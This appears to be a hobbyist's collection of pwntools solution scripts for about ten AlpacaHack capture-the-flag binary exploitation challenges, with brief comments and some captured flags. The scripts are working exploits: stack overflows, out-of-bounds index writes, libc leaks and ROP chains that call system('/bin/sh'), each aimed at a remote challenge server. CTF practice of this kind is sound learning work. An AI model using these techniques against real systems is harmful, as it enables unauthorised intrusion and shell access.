I love pwn challenges from alpacahack I try to do one challenge everytime I can 💖

# Echo

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./echo_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
b echo
continue
'''

def start():
    if args.REMOTE:
        return remote("34.170.146.252", 51069)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================
size = 0x80000000 
data = b"A"*0x110
data += p64(0xcafebabe)
data += p64(elf.sym.win)
sla(b"Size: ", bc(size))
sla(b"Data: ", data)
#========= interactive ====================
r.interactive()
```

# Inbound

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./inbound_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
b main
continue
'''
def start():
    if args.REMOTE:
        return remote("34.170.146.252", 8749)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================
idx = -14
value = elf.sym.win

sla(b"index: ", bc(idx))
sleep(1)
sla(b"value: ", bc(value))

#========= interactive ====================
r.interactive()
```

# Before Write

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
continue
'''

def start():
    if args.REMOTE:
        return remote("34.170.146.252", 18940)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================

payload = b"A"*0x20
payload += p64(0xcafebabe)
payload += p64(elf.sym.win)
sla(b"value: ", payload)

#========= interactive ====================
r.interactive()
```

# CatCPY

Love thsi one hehe

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./catcpy_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
continue
'''

def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

def start():
    if args.REMOTE:
        return remote("34.170.146.252", 55594)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================
payload = b'Y'*8
payload += b"A"*(255-len(payload))
sla(b">", b"2")
sla(b"Data: ", payload)

payload = b"C"*30
payload += p8(0)
sla(b">", b"2")
sla(b"Data: ", payload)

payload = b"D"*15
payload += p8(0)
sla(b">", b"2")
sla(b"Data: ", payload)

payload = b"Y"*11
payload += p64(elf.sym.win)
sla(b">", b"2")
sla(b"Data: ", payload)

#get a shell
sla(b">", b"0")

#========= interactive ====================
r.interactive()
```

# HEX ECHO

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./hexecho_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
b hexecho
continue
'''

def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

def start():
    if args.REMOTE:
        return remote("34.170.146.252", 7297)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================
#Leak

rop = ROP(elf)

# Define the payload list
payloads = [0x4141414141414141] * 0x20 + [0xdeadbeef]  # 0x100/8 = 0x20
payloads2 = [0xdeadbeef, rop.find_gadget(["ret"])[0], elf.sym.main] 

# Convert each integer to a full 8-byte (16 hex digit) zero-padded string in little-endian order
payload_hex_list = ["".join(reversed([f"{p:016X}"[i:i+2] for i in range(0, 16, 2)])) for p in payloads]
payload_hex_list2 = ["".join(reversed([f"{p:016X}"[i:i+2] for i in range(0, 16, 2)])) for p in payloads2]

# Concatenate all payloads into one long string
payload_str = "".join(payload_hex_list)
payload_str2 = "".join(payload_hex_list2)

# Calculate total size in bytes
size = len(payload_str) // 2 
size2 = len(payload_str2) // 2
skipsize = 8

total_size = size + size2 + skipsize + 32

sla(b"Size: ", bc(total_size))
rcu(b"Data (hex): ")

# Send each two-character hex chunk
for i in range(0, len(payload_str), 2):
    sl(payload_str[i:i+2].encode())  # Send in byte format

# Send canary separator
for _ in range(8):
    sl(b"-")

# Send second payload in little-endian format
for i in range(0, len(payload_str2), 2):
    sl(payload_str2[i:i+2].encode())  # Send in byte format

for _ in range(32):
    sl(b"-")

rcu(b"Received: ")
leak = r.recvline().split(b" ")
leak = b"".join(leak[296:302])
leak = int(b"".join([leak[i:i+2] for i in range(0, len(leak), 2)][::-1]),16)
logleak("leak", leak)
libc.address = leak - 0x29d90
libcbase()


# Exploit

rop = ROP(libc)
payloads = [0x4141414141414141] * 0x20 + [0xdeadbeef]  # 0x100/8 = 0x20
payloads2 = [0xdeadbeef,
rop.find_gadget(["pop rdi", "ret"])[0],
next(libc.search(b"/bin/sh")),
rop.find_gadget(["ret"])[0],
libc.sym.system
] 

# Convert each integer to a full 8-byte (16 hex digit) zero-padded string in little-endian order
payload_hex_list = ["".join(reversed([f"{p:016X}"[i:i+2] for i in range(0, 16, 2)])) for p in payloads]
payload_hex_list2 = ["".join(reversed([f"{p:016X}"[i:i+2] for i in range(0, 16, 2)])) for p in payloads2]

# Concatenate all payloads into one long string
payload_str = "".join(payload_hex_list)
payload_str2 = "".join(payload_hex_list2)

# Calculate total size in bytes
size = len(payload_str) // 2 
size2 = len(payload_str2) // 2
skipsize = 8

total_size = size + size2 + skipsize

sla(b"Size: ", bc(total_size))
rcu(b"Data (hex): ")

# Send each two-character hex chunk
for i in range(0, len(payload_str), 2):
    sl(payload_str[i:i+2].encode())  # Send in byte format

# Send canary separator
for _ in range(8):
    sl(b"-")

# Send second payload in little-endian format
for i in range(0, len(payload_str2), 2):
    sl(payload_str2[i:i+2].encode())  # Send in byte format


#========= interactive ====================
r.interactive()
```

# Oyster

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./oyster_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
b *main+208
continue
'''

def start():
    if args.REMOTE:
        return remote("34.170.146.252", 54454)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================

username = b"A"*(0x20-4)
sla(b"Username:", b"root")
password = p64(0)
sla(b"Password:", password)
#
#========= interactive ====================
r.interactive()
#Alpaca{wH4t_5h3L1f1Sh_d0_U_l1K3_7h3_B3s7?}
```

# Write

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
b main
continue
'''

def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

def start():
    if args.REMOTE:
        return remote("34.170.146.252", 42691)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================
index = b"-12"
sla(b"index: ", index)
win = 0x4011b6 #4198838
payload = b"004198838"
payload += b"A"*0x20
sla(b"value: ", payload)

#4198838000000000000000000001
#========= interactive ====================
r.interactive()
```

# Wall

This one was hard :(

```python
#!/usr/bin/env python3

from pwn import *
import sys

elf = ELF("./wall_patched", checksec=False)
libc = ELF("./libc.so.6",checksec=False)
ld = ELF("./ld-2.35.so",checksec=False)

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
b *0x4011d4
continue
'''

def start():
    if args.REMOTE:
        return remote("34.170.146.252", 52893)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================
rop = ROP(elf)

ret = rop.find_gadget(["ret"])[0]

payload = p64(rop.find_gadget(["pop rbp", "ret"])[0])
payload += p64(elf.got.setbuf+0x80)
payload += p64(0x401196)#write gadget

message = p64(ret)*((4096//8)-(len(payload)//8))
message += payload


payload = p64(rop.find_gadget(["pop rbp", "ret"])[0])
payload += p64(elf.got.printf+0x80)
payload += p64(0x4011b1) #
#reto to message


name = p64(ret)*((128//8)-(len(payload)//8))
name += payload

#payload = b"XXXXXXXX"
#payload += b"BBBBBBBB"
#payload += b"C"*(128-len(payload))
while True:
    try:
        r = start()
        r.timeout = 0.5
        sla(b"Message: ", message)
        sla(b"What is your name? ", name)
        r.recvline()
        leak = rcu(b"Message from ", b":")
        rcu(b"\n")

        if b"\x7f" not in leak:  
            log.failure(f"nop!")
            r.close()
        else:
            leak = u64(leak.ljust(8,b"\x00"))
            libc.address = leak - libc.sym.printf
            libcbase()
            break
    except:
        log.failure("nop!")
        pass

            

payload = p64(libc.sym.system)
payload += p64(elf.sym.main)
payload += p64(0) * 6
payload += p64(libc.sym._IO_2_1_stdout_)
payload += p64(0x0)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(0xdeadbeef)*((128//8)-(len(payload)//8))

sl(payload) 

#Alpaca{p1v0T1ng_t0_Bss_i5_tR1cKy_du3_7o_st4Ck_s1Z3_Lim17}

#========= interactive ====================
r.interactive()
```

# Read-write

Nice one

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
b main
b printval
continue
'''

def start():
    if args.REMOTE:
        return remote("34.170.146.252", 49987)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================

rcu(b">")

def f_read(idx):
    idx = idx/8
    sl(b"1")
    sla(b"index: ",bc(idx))
    leak = int(r.recvline().strip())
    return leak
    rcu(b">")

def f_write(idx, value):
    idx = idx/8
    sl(b"2")
    sla(b"index: ",bc(idx))
    sa(b"value: ", bc(value))



 #libc leak
leak = f_read(-0x80)
logleak("libc leak", leak)

libc.address = leak - libc.sym.write
libcbase()
environ = libc.sym.environ
logleak("environ", environ)
#
#array = 0x404040
#environ-array = stack leak
stackleak = f_read((libc.sym.environ-0x404040))
logleak("stack leak", stackleak)

#ret = stackleak -0x120
f_write(stackleak-0x120-0x404040, elf.sym.win)


#========= interactive ====================
r.interactive()
```

# Aush

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./aush_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
set follow-fork-mode parent
b *main + 229
continue
'''

def start():
    if args.REMOTE:
        return remote("34.170.146.252", 62609)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================

username = b"A"*(416)
sa(b"Username: ", username)
sa(b"Password: ", b"A"*0x20+b"\x00"*(416-0x20))

#sla(b"Password: ", b"A"*0x20)
#========= interactive ====================
r.interactive()
#zer0pts{p0lLut3_7h3_3nv1r0nnnNNnnnNnnnnNNNnnNnnNn}
```